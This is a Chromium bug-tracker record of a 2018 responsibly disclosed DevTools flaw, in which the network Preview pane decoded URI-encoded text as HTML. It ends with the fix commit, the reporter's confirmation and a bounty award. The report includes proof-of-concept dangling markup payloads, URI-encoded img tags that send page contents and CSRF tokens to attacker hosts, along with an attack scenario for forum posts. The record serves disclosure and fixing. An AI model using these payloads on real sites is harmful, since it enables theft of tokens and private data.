# Security: Markup injection is possible in the Preview feature in the Developer Tools due to mishandling of URI encoded strings

| Field | Value |
|-------|-------|
| **Issue ID** | [40092689](https://issues.chromium.org/issues/40092689) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | sh...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2018-10-13 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Preview feature in the Developer Tools handles URI encoded strings in the response body in an unsafe manner that allows for markup injections. The URI encoded strings are decoded and interpreted as part of the HTML, therefore someone who is able to inject a URI encoded string to a page will become able to inject a DOM in the Preview pane in the Developer Tools. While XSS is not possible by exploiting this, this makes dangling markup injection possible that can lead to information disclosure.

**VERSION**  

Chrome Version: [71.0.3578.5] + [dev] (Latest Chrome Canary)  

Also tested on Chrome Version: [69.0.3497.100] + [stable] (Latest Chrome)  

Operating System: [macOS Mojave 10.14]

**REPRODUCTION CASE**  

A site such as below is a demonstration for this bug. The URI encoded string is interpreted as an img tag allowing for a dangling markup injection, which differs from the way the site should be displayed.

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body>
%3Cimg%20src%3D%27https%3A%2F%2Fevil%2Eshinkbr%2Enet%2Fsteal%2Ddata%3Fdata%3D

some\_secret\_information

' Required single quote to close the src attribute

> Required closing bracket to close the img tag

 </body>
</html>

Steps to reproduce:

1. Launch Google Chrome, open Developer Tools > Network tab, and access a site with the above HTML.  
   
   I have attached index.html that contain the above HTML, and I have also setup a site <https://poc.shinkbr.net/chrome-preview-injection-8ubB4QAUdhB42iE/> that serves the above HTML.
2. Go to the Network Tab and click on the HTTP request for the page. Open the Preview pane.
3. The page is displayed, with URI encoded strings interpreted as part of the DOM, where it shouldn't. At the same time, a HTTP request is sent to <https://evil.shinbr.net/steal-data?data=some_secret_information> containing parts of the page's information.

Limitation: Some conditions must be met, such as the required closing quote and bracket, and user interactions (open the preview pane) are required.

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Shintaro Kobori

## Attachments

- [index.html](attachments/index.html) (text/plain, 301 B)
- [chrome-preview-injection-8ubB4QAUdhB42iE.png](attachments/chrome-preview-injection-8ubB4QAUdhB42iE.png) (image/png, 560.6 KB)

## Timeline

### wf...@chromium.org (2018-10-16)

Thanks for the report. It does seem weird that the preview pane would render this page differently. However, I'm not sure of a high level of risk to users here given the developer must already control the site that this page is on, and it requires that developer tools be opened.

dgozman -> can you take a look at this?

[Monorail components: Platform>DevTools]

### sh...@gmail.com (2018-10-16)

Thanks for checking in.

> developer must already control the site

One thing to note here is that URI encoded strings can be injected in forum- or SNS-style sites by simply posting it.
HTML strings are commonly escaped in order to prevent markup injections, but URI encoded strings are not.

To make clear of the posed risk, upon successful exploit, the following is possible:
- dangling markup injection = information leak with some restrictions
- GET-based CSRFs like logout CSRF by injecting iframes

But the limitations are...
- victim must see the page in the preview pane

Thanks,

### sh...@gmail.com (2018-10-16)

To elaborate more on dangling markup injection, an attack scenario would be something like this, where authenticity_token (csrf token) will be at risk.

<p>%3Cimg%20src%3D%27https%3A%2F%2Fevil%2Eshinkbr%2Enet%2Fsteal%2Ddata%3Fdata%3D</p><form><input type="hidden" name="authenticity_token" value="secretsecret"></form><p>'</p>

The restrictions are, however, new lines between the URI encoded string and the closing single quote seems to prevent this from working.

Thanks,

### sh...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### dg...@chromium.org (2018-10-17)

Joey, could you please take a look?

### dg...@chromium.org (2018-10-17)

Could you help me to understand where is the security issue here? Where does the "secretsecret" come from? What are the parties involved? Which party had an access to the secret, and which one gets it after this issue?

From my understanding, we just present information from the iframe in DevTools in a wrong way. If the iframe were not to escape that img tag, we'll show exactly the same img and everything else, but that would be expected. I don't really see where is the information leak here.

### sh...@gmail.com (2018-10-18)

The security risk being proposed here is mainly the possibility of Dangling Markup Injection attack.
https://blog.innerht.ml/csp-2015/#danglingmarkupinjection

With dangling markup injection attack, one can steal contents of a HTML by injecting a broken script tag before the contents he wishes to steal. For example, the following would send a HTTP request to an evil.example.com containing the contents of the HTML that come after the injected string.

#####
<!-- injected string -->
<img src='https://evil.example.com/steal-data?data=

<div>content-one-wishes-to-steal</div>
<input type="hidden" name="csrf_token" value="secret">
#####

The contents here could be anything; The most likely targets are, I would imagine, CSRF tokens and script nonces.

> What are the parties involved? Which party had an access to the secret, and which one gets it after this issue?

As I wrote in a previous comment, one possible attack scenario would be injecting a URI encoded string in a forum- or SNS-style site, where the attacker is able to post texts to a page where a victim would read.
If an attacker posts a string like %3Cimg%20src%3D%27https%3A%2F%2Fevil%2Eexample%2Ecom%2Fsteal%2Ddata%3Fdata%3D (this is a URI encoded version of "<img src='https://evil.example.com/steal-data?data=") in a SNS, and someone views the page in his preview pane, that would make his browser send the remaining HTML, possibly containing CSRF tokens or private posts, to evil.example.com where the attacker controls.

So, to answer your question, the parties involved are
1. attacker
2. victim
3. SNS or forum where both attacker and victim can read / write

Possible scenario is:
1. Attacker posts a malicious URI encoded string to the site
2. Victim views that page in his preview pane
3. Contents of the page gets sent to the attackers server

Thanks,

### sh...@gmail.com (2018-10-19)

> With dangling markup injection attack, one can steal contents of a HTML by injecting a broken script tag

I meant to say broken HTML tag, sorry

### dg...@chromium.org (2018-10-22)

I see, thanks. This is more of a social engineering attack, but I can see why this might be unexpected.

### bu...@chromium.org (2018-10-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0238c6b5064859f39ff5f6d3265712093934b2a7

commit 0238c6b5064859f39ff5f6d3265712093934b2a7
Author: Joey Arhar <jarhar@chromium.org>
Date: Tue Oct 23 00:12:40 2018

[DevTools] Fix request preview for URI encoded html

Bug: 895081
Change-Id: I49c6131e1cc432e470e4b04353282d3ebebcb063
Reviewed-on: https://chromium-review.googlesource.com/c/1286758
Reviewed-by: Dmitry Gozman <dgozman@chromium.org>
Commit-Queue: Joey Arhar <jarhar@chromium.org>
Cr-Commit-Position: refs/heads/master@{#601792}
[add] https://crrev.com/0238c6b5064859f39ff5f6d3265712093934b2a7/third_party/WebKit/LayoutTests/http/tests/devtools/network/request-preview-uri-escaping-expected.txt
[add] https://crrev.com/0238c6b5064859f39ff5f6d3265712093934b2a7/third_party/WebKit/LayoutTests/http/tests/devtools/network/request-preview-uri-escaping.js
[modify] https://crrev.com/0238c6b5064859f39ff5f6d3265712093934b2a7/third_party/blink/renderer/devtools/front_end/network/RequestHTMLView.js


### ja...@chromium.org (2018-10-23)

shinkbr@gmail.com I submitted a fix which is live in Canary. Could you verify that it is fixed in Canary?

### sh...@gmail.com (2018-10-27)

jarhar@chromium.org I have rechecked and confirmed that this has been fixed. Thanks for the quick fix!

### ja...@chromium.org (2018-10-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-31)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-11-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-11-02)

Thanks for the report, shinkbr@! The Chrome VRP panel decided to award $500 for this, a member of our finance team will be in touch to arrange payment. Cheers!

### aw...@google.com (2018-11-02)

[Empty comment from Monorail migration]

### sh...@gmail.com (2019-01-30)

Hi,

I realized that this fix has been released in Chrome 72, but this bug wasn't acknowledged in https://chromereleases.googleblog.com/2019/01/stable-channel-update-for-desktop.html . 
Was this bug skipped for some reason, or is it just that not all bugs make the list?
I know this is a small issue, but sometimes acknowledgement means more than monetary rewards. If that's the way it works, that is fine too.

By the way, the payment has been completed, and I was able to receive the reward. Thanks!

### ja...@chromium.org (2019-01-30)

Sorry to hear that, unfortunately I’m not familiar with how those release posts are created.

### ct...@chromium.org (2019-01-30)

+awhalley to help with #19.

### aw...@google.com (2019-01-30)

Hi shinkbr@ - sorry about that. This bug was never assigned a milestone label so was missed by automation.  I'll get the page updated today.

### aw...@google.com (2019-01-30)

[Empty comment from Monorail migration]

### sh...@gmail.com (2019-02-01)

Thanks! I'll wait for the update.

### aw...@google.com (2019-02-01)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-01)

https://chromereleases.googleblog.com/2019/01/stable-channel-update-for-desktop.html has been updated!

### sh...@gmail.com (2019-02-01)

Thank you very much!

### sh...@chromium.org (2019-02-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-02-19)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/895081?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092689)*
